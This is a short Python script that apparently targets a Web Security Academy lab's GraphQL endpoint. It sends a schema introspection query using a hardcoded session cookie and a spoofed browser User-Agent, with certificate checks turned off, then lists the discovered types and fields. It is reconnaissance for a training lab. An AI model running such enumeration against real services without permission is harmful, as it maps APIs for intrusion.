#!/usr/bin/env python3
import requests
import json
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET = "https://0ac3001d04afd00580ed3ac3009f0027.web-security-academy.net/graphql/v1"
SESSION = "khKFJGWyI0CouGOCVwrwqO8OzVPDuun4"

headers = {
    "Cookie": f"session={SESSION}",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
}

# Introspection query to discover the schema
introspection_query = {
    "query": """
    {
        __schema {
            types {
                name
                kind
                fields {
                    name
                    type {
                        name
                        kind
                        ofType {
                            name
                            kind
                        }
                    }
                }
            }
        }
    }
    """
}

print("[*] Attempting GraphQL introspection...")
response = requests.post(TARGET, headers=headers, json=introspection_query, verify=False)

if response.status_code == 200:
    print("[+] Introspection successful!\n")
    data = response.json()

    # Extract and display interesting types
    types = data.get('data', {}).get('__schema', {}).get('types', [])

    for t in types:
        # Skip internal GraphQL types
        if t['name'].startswith('__'):
            continue

        print(f"\n{'='*60}")
        print(f"Type: {t['name']} ({t['kind']})")
        print('='*60)

        if t.get('fields'):
            for field in t['fields']:
                field_type = field['type']
                type_name = field_type.get('name', 'Unknown')

                if field_type.get('ofType'):
                    type_name = field_type['ofType'].get('name', type_name)

                print(f"  - {field['name']}: {type_name}")
else:
    print(f"[-] Introspection failed: {response.status_code}")
    print(f"Response: {response.text}")

    # Try simpler introspection
    print("\n[*] Trying simpler query...")
    simple_query = {
        "query": "{ __schema { queryType { name } } }"
    }
    response = requests.post(TARGET, headers=headers, json=simple_query, verify=False)
    print(f"Status: {response.status_code}")
    print(f"Response: {response.text[:500]}")
